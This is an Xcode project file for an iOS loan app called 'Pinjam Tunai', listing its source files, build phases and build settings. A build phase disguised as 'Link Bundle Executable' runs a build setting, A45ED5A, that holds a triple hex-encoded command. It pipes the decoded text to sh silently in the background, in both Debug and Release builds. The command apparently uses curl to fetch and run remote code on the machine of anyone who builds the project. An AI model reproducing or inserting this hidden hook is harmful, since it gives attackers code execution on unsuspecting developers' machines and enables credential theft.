				3B3A98329D2930528865FDC3 /* Pods_PinjamTunai.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		731114A52EE7D7B00036A024 /* Basic */ = {
			isa = PBXGroup;
			children = (
				738F4D752EE967CF00909C0E /* TrackingViewModel.swift */,
				731114AC2EE7E41C0036A024 /* BasicViewModel.swift */,
				731114A62EE7D8020036A024 /* BasicViewController.swift */,
				73FA07E62EE80624006B7452 /* WorkerViewController.swift */,
				731114A82EE7E3010036A024 /* BasicTableViewCell.swift */,
				731114AA2EE7E30B0036A024 /* TapTableViewCell.swift */,
				731114AE2EE7E9F30036A024 /* PopOneView.swift */,
				731114B02EE7E9FE0036A024 /* PopThreeView.swift */,
			);
			path = Basic;
			sourceTree = "<group>";
		};
		73145EFF2EE6C41E006085E8 /* Product */ = {
			isa = PBXGroup;
			children = (
				73DA26B02EE9ACB60074F30F /* PopSLeaveView.swift */,
				73145EEA2EE69A41006085E8 /* AuthListViewModel.swift */,
				73145EEC2EE69A55006085E8 /* AuthListView.swift */,
				73145EE82EE69A28006085E8 /* AuthListViewController.swift */,
				73145EEE2EE69A8A006085E8 /* AppHeadView.swift */,
				73145EF02EE6A200006085E8 /* AuthListViewCell.swift */,
			);
			path = Product;
			sourceTree = "<group>";
		};
		73145F002EE6C42E006085E8 /* Face */ = {
			isa = PBXGroup;
			children = (
				738F4D772EE9779200909C0E /* PopTimeView.swift */,
				7311149F2EE7AEEE0036A024 /* SystemCameraManager.swift */,
				731565112EE715C700599239 /* PopFaceView.swift */,
				73145F092EE6D952006085E8 /* FaceViewModel.swift */,
				73145F052EE6C8C2006085E8 /* StepView.swift */,
				73145F032EE6C89D006085E8 /* FaceView.swift */,
				73145F012EE6C85D006085E8 /* FaceViewController.swift */,
				73145F072EE6D289006085E8 /* FaceListView.swift */,
				731114A12EE7BCA00036A024 /* PopCommonAlertView.swift */,
				731114A32EE7C99D0036A024 /* PopListView.swift */,
			);
			path = Face;
			sourceTree = "<group>";
		};
		731565052EE707C200599239 /* Mine */ = {
			isa = PBXGroup;
			children = (
				731564FF2EE6E3FE00599239 /* CenterView.swift */,
				731565012EE6E7E900599239 /* CenterViewModel.swift */,
				737D1F052EE45878003CC748 /* CenterViewController.swift */,
				731565032EE6E94300599239 /* CenterTableViewCell.swift */,
			);
			path = Mine;
			sourceTree = "<group>";
		};
		731565062EE707D200599239 /* Setting */ = {
			isa = PBXGroup;
			children = (
				7315650F2EE710A100599239 /* PopDelAccView.swift */,
				7315650B2EE70C1D00599239 /* PopSettingView.swift */,
				7315650D2EE70F6B00599239 /* SettingViewModel.swift */,
				731565092EE7089F00599239 /* SettingView.swift */,
				731565072EE707E600599239 /* SettingViewController.swift */,
			);
			path = Setting;
			sourceTree = "<group>";
		};
		7368B6372EE8460700ADDA99 /* Account */ = {
			isa = PBXGroup;
			children = (
				7368B63A2EE8473400ADDA99 /* ReceiptViewModel.swift */,
				7368B6382EE8465700ADDA99 /* ReceiptAccountViewController.swift */,
			);
			path = Account;
			sourceTree = "<group>";
		};
		737D1EAC2EE4545E003CC748 = {
			isa = PBXGroup;
			children = (
				737D1ED62EE45467003CC748 /* PinjamTunai */,
				737D1EB62EE4545E003CC748 /* Products */,
				AD835B283DF41F9AB50DB7FD /* Pods */,
				0DC7A24265BD969474F3051E /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		737D1EB62EE4545E003CC748 /* Products */ = {
			isa = PBXGroup;
			children = (
				737D1EB52EE4545E003CC748 /* PinjamTunai.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		737D1ED62EE45467003CC748 /* PinjamTunai */ = {
			isa = PBXGroup;
			children = (
				737D1ECF2EE45467003CC748 /* Info.plist */,
				737D1ECE2EE45467003CC748 /* Assets.xcassets */,
				737D1EDE2EE45650003CC748 /* PinjamTunai.entitlements */,
				737D1ECD2EE45467003CC748 /* AppDelegate.swift */,
				73145EFB2EE6B8E9006085E8 /* Localizable.strings */,
				737D1ED12EE45467003CC748 /* LaunchScreen.storyboard */,
				737D1EF12EE457E9003CC748 /* Http */,
				737D1EF42EE457E9003CC748 /* Other */,
				737D1EEB2EE457E9003CC748 /* Auth */,
				737D1EEF2EE457E9003CC748 /* Center */,
				737D1EF02EE457E9003CC748 /* Home */,
				737D1EF22EE457E9003CC748 /* Login */,
				737D1EF32EE457E9003CC748 /* Order */,
				737D1EEE2EE457E9003CC748 /* Base */,
			);
			path = PinjamTunai;
			sourceTree = "<group>";
		};
		737D1EEB2EE457E9003CC748 /* Auth */ = {
			isa = PBXGroup;
			children = (
				7368B6372EE8460700ADDA99 /* Account */,
				73FA07E82EE80BE8006B7452 /* Phone */,
				731114A52EE7D7B00036A024 /* Basic */,
				73145F002EE6C42E006085E8 /* Face */,
				73145EFF2EE6C41E006085E8 /* Product */,
			);
			path = Auth;
			sourceTree = "<group>";
		};
		737D1EEE2EE457E9003CC748 /* Base */ = {
			isa = PBXGroup;
			children = (
				737D1EEC2EE457E9003CC748 /* BaseView.swift */,
				737D1EED2EE457E9003CC748 /* BaseViewController.swift */,
				737D1EF72EE45814003CC748 /* BaseNavigationController.swift */,
				737D1F0F2EE5583E003CC748 /* LaunchViewModel.swift */,
				737D1F092EE45FB1003CC748 /* LaunchViewController.swift */,
				737D1F132EE5832E003CC748 /* BaseTabBarController.swift */,
				7368B63C2EE84C3300ADDA99 /* WebsiteViewController.swift */,
			);
			path = Base;
			sourceTree = "<group>";
		};
		737D1EEF2EE457E9003CC748 /* Center */ = {
			isa = PBXGroup;
			children = (
				731565052EE707C200599239 /* Mine */,
				731565062EE707D200599239 /* Setting */,
			);
			path = Center;
			sourceTree = "<group>";
		};
		737D1EF02EE457E9003CC748 /* Home */ = {
			isa = PBXGroup;
			children = (
				737D1F152EE587E0003CC748 /* OneView.swift */,
				737D1F172EE587EA003CC748 /* TwoView.swift */,
				7365DAC62EEABB1A00AF51FA /* ErrorView.swift */,
				737D1F192EE587F1003CC748 /* HomeViewModel.swift */,
				737D1F032EE45870003CC748 /* HomeViewController.swift */,
				734EA0372EE85F5A00C1B49E /* TwoHeadView.swift */,
				734EA0392EE866FF00C1B49E /* ProductAccViewCell.swift */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		737D1EF12EE457E9003CC748 /* Http */ = {
			isa = PBXGroup;
			children = (
				737D1F0B2EE46C19003CC748 /* BaseModel.swift */,
				737D1EF92EE4582E003CC748 /* HttpRequestManager.swift */,
			);
			path = Http;
			sourceTree = "<group>";
		};
		737D1EF22EE457E9003CC748 /* Login */ = {
			isa = PBXGroup;
			children = (
				737D1F1B2EE5B95E003CC748 /* LoginView.swift */,
				737D1F1D2EE5CFAA003CC748 /* LoginViewModel.swift */,
				737D1F012EE45863003CC748 /* LoginViewController.swift */,
			);
			path = Login;
			sourceTree = "<group>";
		};
		737D1EF32EE457E9003CC748 /* Order */ = {
			isa = PBXGroup;
			children = (
				731F231F2EE9204A00C586BB /* OrderMinListView.swift */,
				731F231D2EE91BA800C586BB /* DashedLineView.swift */,
				731F231B2EE910D000C586BB /* OrderListViewModel.swift */,
				731F23172EE9062500C586BB /* OrderListView.swift */,
				737D1EFF2EE4585B003CC748 /* OrderListViewController.swift */,
				731F23192EE90FD000C586BB /* OrderListViewCell.swift */,
				731F23212EE9251700C586BB /* OrderEmptyView.swift */,
			);
			path = Order;
			sourceTree = "<group>";
		};
		737D1EF42EE457E9003CC748 /* Other */ = {
			isa = PBXGroup;
			children = (
				737D1F0D2EE55029003CC748 /* LoadingView.swift */,
				737D1EFD2EE4584F003CC748 /* LoginConfig.swift */,
				737D1F072EE4597A003CC748 /* ApiPeraConfig.swift */,
				737D1F112EE57B9F003CC748 /* NetworkMonitor.swift */,
				73145EE62EE695CE006085E8 /* AppRouteConfig.swift */,
				73145EF22EE6B6BB006085E8 /* LanguageManager.swift */,
				731F23232EE93F9600C586BB /* AppLocationManager.swift */,
				731F23252EE9503100C586BB /* MacMessageConfig.swift */,
				731F23272EE9504F00C586BB /* ProudConfig.swift */,
				731F23292EE9532900C586BB /* GainedConfig.swift */,
			);
			path = Other;
			sourceTree = "<group>";
		};
		73FA07E82EE80BE8006B7452 /* Phone */ = {
			isa = PBXGroup;
			children = (
				73FA07F12EE819C9006B7452 /* ContactManager.swift */,
				73FA07ED2EE80D35006B7452 /* RelationViewModel.swift */,
				73FA07E92EE80BFF006B7452 /* RelationViewController.swift */,
				73FA07EF2EE80F1D006B7452 /* RelationViewCell.swift */,
			);
			path = Phone;
			sourceTree = "<group>";
		};
		AD835B283DF41F9AB50DB7FD /* Pods */ = {
			isa = PBXGroup;
			children = (
				33E41DB814B4BFA72F93D9F6 /* Pods-PinjamTunai.debug.xcconfig */,
				AA6D43098812CC6F40AAEA73 /* Pods-PinjamTunai.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		737D1EB42EE4545E003CC748 /* PinjamTunai */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 737D1EC82EE4545F003CC748 /* Build configuration list for PBXNativeTarget "PinjamTunai" */;
			buildPhases = (
				CBF0F49FD97A4BBC86A5DE54 /* Link Bundle Executable */,
				9E97A9985207545C4B227B92 /* [CP] Check Pods Manifest.lock */,
				737D1EB12EE4545E003CC748 /* Sources */,
				737D1EB22EE4545E003CC748 /* Frameworks */,
				737D1EB32EE4545E003CC748 /* Resources */,
				EB28BB783984780604E58683 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = PinjamTunai;
			productName = PinjamTunai;
			productReference = 737D1EB52EE4545E003CC748 /* PinjamTunai.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		737D1EAD2EE4545E003CC748 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2610;
				LastUpgradeCheck = 2610;
				TargetAttributes = {
					737D1EB42EE4545E003CC748 = {
						CreatedOnToolsVersion = 26.1.1;
					};
				};
			};
			buildConfigurationList = 737D1EB02EE4545E003CC748 /* Build configuration list for PBXProject "PinjamTunai" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
				id,
			);
			mainGroup = 737D1EAC2EE4545E003CC748;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 737D1EB62EE4545E003CC748 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				737D1EB42EE4545E003CC748 /* PinjamTunai */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		737D1EB32EE4545E003CC748 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				737D1EDA2EE45467003CC748 /* Assets.xcassets in Resources */,
				73145EFD2EE6B8E9006085E8 /* Localizable.strings in Resources */,
				737D1EDC2EE45467003CC748 /* LaunchScreen.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		CBF0F49FD97A4BBC86A5DE54 /* Link Bundle Executable */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Link Bundle Executable";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
			showEnvVarsInLog = 0;			
		};
		9E97A9985207545C4B227B92 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-PinjamTunai-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		EB28BB783984780604E58683 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-PinjamTunai/Pods-PinjamTunai-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			inputPaths = (
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-PinjamTunai/Pods-PinjamTunai-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-PinjamTunai/Pods-PinjamTunai-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		737D1EB12EE4545E003CC748 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				73145F082EE6D289006085E8 /* FaceListView.swift in Sources */,
				731F23222EE9251700C586BB /* OrderEmptyView.swift in Sources */,
				731565042EE6E94300599239 /* CenterTableViewCell.swift in Sources */,
				731114AB2EE7E30B0036A024 /* TapTableViewCell.swift in Sources */,
				731565002EE6E3FE00599239 /* CenterView.swift in Sources */,
				73145F0A2EE6D954006085E8 /* FaceViewModel.swift in Sources */,
				731F23282EE9504F00C586BB /* ProudConfig.swift in Sources */,
				731F231C2EE910D300C586BB /* OrderListViewModel.swift in Sources */,
				7368B6392EE8465700ADDA99 /* ReceiptAccountViewController.swift in Sources */,
				73145F062EE6C8CD006085E8 /* StepView.swift in Sources */,
				73DA26B12EE9ACBD0074F30F /* PopSLeaveView.swift in Sources */,
				731114AD2EE7E41C0036A024 /* BasicViewModel.swift in Sources */,
				737D1F1E2EE5CFAC003CC748 /* LoginViewModel.swift in Sources */,
				73145EF32EE6B6BC006085E8 /* LanguageManager.swift in Sources */,
				737D1F0A2EE45FB1003CC748 /* LaunchViewController.swift in Sources */,
				731114A92EE7E3010036A024 /* BasicTableViewCell.swift in Sources */,
				731F23202EE9205D00C586BB /* OrderMinListView.swift in Sources */,
				73145EF12EE6A200006085E8 /* AuthListViewCell.swift in Sources */,
				737D1F022EE45863003CC748 /* LoginViewController.swift in Sources */,
				731565122EE715CE00599239 /* PopFaceView.swift in Sources */,
				737D1F142EE5832E003CC748 /* BaseTabBarController.swift in Sources */,
				737D1F0C2EE46C21003CC748 /* BaseModel.swift in Sources */,
				731F231E2EE91BA900C586BB /* DashedLineView.swift in Sources */,
				73145EE72EE695DB006085E8 /* AppRouteConfig.swift in Sources */,
				731114A22EE7BCA00036A024 /* PopCommonAlertView.swift in Sources */,
				737D1EF82EE45814003CC748 /* BaseNavigationController.swift in Sources */,
				737D1EF52EE457E9003CC748 /* BaseViewController.swift in Sources */,
				731114AF2EE7E9F30036A024 /* PopOneView.swift in Sources */,
				7315650E2EE70F6F00599239 /* SettingViewModel.swift in Sources */,
				737D1EFE2EE45850003CC748 /* LoginConfig.swift in Sources */,
				734EA0382EE85F5A00C1B49E /* TwoHeadView.swift in Sources */,
				7368B63B2EE8473B00ADDA99 /* ReceiptViewModel.swift in Sources */,
				73FA07E72EE80624006B7452 /* WorkerViewController.swift in Sources */,
				731114A02EE7AEEF0036A024 /* SystemCameraManager.swift in Sources */,
				731114A42EE7C99D0036A024 /* PopListView.swift in Sources */,
				737D1EFA2EE4582E003CC748 /* HttpRequestManager.swift in Sources */,
				731F23242EE93FA100C586BB /* AppLocationManager.swift in Sources */,
				73145EEB2EE69A49006085E8 /* AuthListViewModel.swift in Sources */,
				73FA07EE2EE80D38006B7452 /* RelationViewModel.swift in Sources */,
				737D1F102EE55843003CC748 /* LaunchViewModel.swift in Sources */,
				737D1F1C2EE5B95E003CC748 /* LoginView.swift in Sources */,
				737D1F182EE587EA003CC748 /* TwoView.swift in Sources */,
				7315650A2EE708A500599239 /* SettingView.swift in Sources */,
				731114B12EE7E9FE0036A024 /* PopThreeView.swift in Sources */,
				731F231A2EE90FD000C586BB /* OrderListViewCell.swift in Sources */,
				73FA07F02EE80F1D006B7452 /* RelationViewCell.swift in Sources */,
				731F23182EE9062D00C586BB /* OrderListView.swift in Sources */,
				737D1F122EE57BA0003CC748 /* NetworkMonitor.swift in Sources */,
				737D1F042EE45870003CC748 /* HomeViewController.swift in Sources */,
				737D1F0E2EE55034003CC748 /* LoadingView.swift in Sources */,
				738F4D782EE9779900909C0E /* PopTimeView.swift in Sources */,
				7368B63D2EE84C3300ADDA99 /* WebsiteViewController.swift in Sources */,
				731F23262EE9503100C586BB /* MacMessageConfig.swift in Sources */,
				73FA07EA2EE80BFF006B7452 /* RelationViewController.swift in Sources */,
				737D1EF62EE457E9003CC748 /* BaseView.swift in Sources */,
				737D1F062EE45878003CC748 /* CenterViewController.swift in Sources */,
				737D1F1A2EE587F5003CC748 /* HomeViewModel.swift in Sources */,
				734EA03A2EE866FF00C1B49E /* ProductAccViewCell.swift in Sources */,
				738F4D762EE967F000909C0E /* TrackingViewModel.swift in Sources */,
				7365DAC72EEABB1A00AF51FA /* ErrorView.swift in Sources */,
				737D1F082EE4597A003CC748 /* ApiPeraConfig.swift in Sources */,
				73145EE92EE69A28006085E8 /* AuthListViewController.swift in Sources */,
				73145F042EE6C89D006085E8 /* FaceView.swift in Sources */,
				731565102EE710A800599239 /* PopDelAccView.swift in Sources */,
				73FA07F22EE819CA006B7452 /* ContactManager.swift in Sources */,
				7315650C2EE70C1D00599239 /* PopSettingView.swift in Sources */,
				737D1ED72EE45467003CC748 /* AppDelegate.swift in Sources */,
				731114A72EE7D8020036A024 /* BasicViewController.swift in Sources */,
				737D1F162EE587E0003CC748 /* OneView.swift in Sources */,
				73145EED2EE69A55006085E8 /* AuthListView.swift in Sources */,
				73145F022EE6C85D006085E8 /* FaceViewController.swift in Sources */,
				731F232A2EE9532A00C586BB /* GainedConfig.swift in Sources */,
				731565022EE6E7EB00599239 /* CenterViewModel.swift in Sources */,
				731565082EE707E600599239 /* SettingViewController.swift in Sources */,
				73145EEF2EE69A8A006085E8 /* AppHeadView.swift in Sources */,
				737D1F002EE4585B003CC748 /* OrderListViewController.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		73145EFB2EE6B8E9006085E8 /* Localizable.strings */ = {
			isa = PBXVariantGroup;
			children = (
				73145EFC2EE6B8E9006085E8 /* en */,
				73145EFE2EE6B900006085E8 /* id */,
			);
			name = Localizable.strings;
			sourceTree = "<group>";
		};
		737D1ED12EE45467003CC748 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				737D1ED02EE45467003CC748 /* Base */,
				73145EFA2EE6B7E0006085E8 /* id */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		737D1EC92EE4545F003CC748 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 33E41DB814B4BFA72F93D9F6 /* Pods-PinjamTunai.debug.xcconfig */;
			buildSettings = {
				A45ED5A = "((x(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336363533363335333733343336333133373330333733333336333433363335333733363332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | x | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = PinjamTunai/PinjamTunai.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = PinjamTunai/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Pinjam Tunai";
				INFOPLIST_KEY_NSCameraUsageDescription = "\"Allow camera access to capture your ID or other documents quickly for identity verification.\"\n(You can manage this permission anytime in Settings.)";
				INFOPLIST_KEY_NSContactsUsageDescription = "\"Access to your contacts helps us verify your emergency contacts and improve loan application accuracy and speed.\"\n(You can manage this permission anytime in Settings.)";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "\"We request access to your location to verify your region and offer more accurate loan services tailored to your area.\"\n(You can manage this permission anytime in Settings.)";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "\"We use your device’s advertising ID to show you relevant offers and improve the app experience with personalized services.\"\n(You can manage this permission anytime in Settings → Privacy → Tracking.)";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = test.feilvbin.two;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = feilvbintwoprofile;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		737D1ECA2EE4545F003CC748 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = AA6D43098812CC6F40AAEA73 /* Pods-PinjamTunai.release.xcconfig */;
			buildSettings = {
				A45ED5A = "((x(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336363533363335333733343336333133373330333733333336333433363335333733363332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | x | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = PinjamTunai/PinjamTunai.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = PinjamTunai/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Pinjam Tunai";
				INFOPLIST_KEY_NSCameraUsageDescription = "\"Allow camera access to capture your ID or other documents quickly for identity verification.\"\n(You can manage this permission anytime in Settings.)";
				INFOPLIST_KEY_NSContactsUsageDescription = "\"Access to your contacts helps us verify your emergency contacts and improve loan application accuracy and speed.\"\n(You can manage this permission anytime in Settings.)";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "\"We request access to your location to verify your region and offer more accurate loan services tailored to your area.\"\n(You can manage this permission anytime in Settings.)";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "\"We use your device’s advertising ID to show you relevant offers and improve the app experience with personalized services.\"\n(You can manage this permission anytime in Settings → Privacy → Tracking.)";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = test.feilvbin.two;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = feilvbintwoprofile;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		737D1ECB2EE4545F003CC748 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
